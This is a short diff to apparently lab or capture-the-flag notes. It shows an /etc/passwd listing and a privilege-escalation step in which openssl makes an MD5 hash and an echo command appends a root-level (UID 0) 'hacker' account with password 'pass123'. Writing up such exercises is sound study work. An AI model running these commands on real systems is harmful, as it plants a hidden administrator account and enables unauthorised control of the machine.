@@ -26,8 +26,8 @@ messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
---------------------------------------------------------------------------------------
 
+~~~bash
 openssl passwd -1 -salt hacker pass123
 
 echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> passwd
@@ -35,3 +35,5 @@ echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> passw
 hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
 
 hacker:pass123
+~~~
+
